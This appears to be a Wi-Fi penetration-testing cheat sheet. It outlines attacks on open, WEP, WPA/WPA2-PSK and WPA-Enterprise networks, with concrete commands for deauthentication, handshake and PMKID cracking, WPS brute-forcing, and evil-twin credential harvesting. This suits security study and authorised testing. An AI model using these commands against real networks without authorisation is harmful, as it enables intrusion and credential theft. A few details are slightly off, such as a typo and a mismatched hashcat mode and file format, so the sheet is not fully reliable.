# CRACKING CONCEPTS

**Category:** HIGH LEVEL
## Open (OPN) Networks
No encryption. Anyone can connect and sniff traffic (unless HTTPS is used).

```bash
Passive sniffing (e.g., airodump-ng, tcpdump)
ARP spoofing, DNS spoofing, session hijacking (e.g., ettercap, bettercap)
Evil twin or captive portal injection
```

## Wired Equivalency Prototol (WEP) Networks
Very weak encryption, crackable in minutes.

```bash
Capture a large number of IVs (Initialization Vectors) with airodump-ng
Speed up collection with ARP replay:
   aireplay-ng -3 -b <BSSID> -h <your MAC> wlan1
Crack key with:
   aircrack-ng <capture file>
```

## WPA/WPA2-Personal (PSK) Networks
Shared password, secured via a 4-way handshake.
Primary attack: Capture the handshake and crack it offline with a wordlist.

Standard Attack Flow
```bash
Start monitor mode and capture traffic: airodump-ng
Deauth a client: aireplay-ng -0 10 -a <BSSID> -c <client> wlan1
Wait for reconnect — capture the 4-way handshake
Crack:
    aircrack-ng -w <wordlist> <capture.cap>
```

PMKID Attack (No client needed)
Works on some routers (mainly Broadcom)
```bash
hcxdumptool -i wlan1mon -o dump.pcapng --enable_status=1
hcxpcapngtool -o pmkid.hccapx dump.pcapng
hashcat -m 16800 pmkid.hccapx -a 0 <wordlist>
```
WPS PIN Brute-force (Vulnerable routers with WPS enabled)
```bash
reaver -i wlan1mon -b <BSSID> -vv
```

Offline Rainbow Table Attacks (e.g. cowpatty)
```bash
Pre-computed PMKs based on SSID and dictionary
```



## WPA/WPA2-Enterprise (WPA-MGT / WPA-EAP) Networks
Uses 802.1X with a RADIUS server and EAP authentication
Password not stored in a static hash like PSK — must be captured in real-time during login and cracked.

Evil Twin (PEAP/MSCHAPv2)
```bash
Spoof real SSID using hostapd-wpe
User connects, supplies credentials → hashes logged
Crack with asleap or hashcat (MSCHAPv2 hash)
```

Rogue AP / Probe Attack
```bash
Use hostapd-wpe or eaphammer to listen for probe requests
Stand up AP with matching SSID
When client autoconnects, grab MSCHAPv2 creds
```

MITM Downgrade (EAP-Relay)
```bash
Relay client’s credentials to real server (e.g., wifiphisher MITM attacks)
May work depending on misconfigurations
```

Credential Harvesting w/ Fake Portal
```bash
Use wifiphisher or custom captive portal
Not a hash-based crack, but still credential theft
```
--
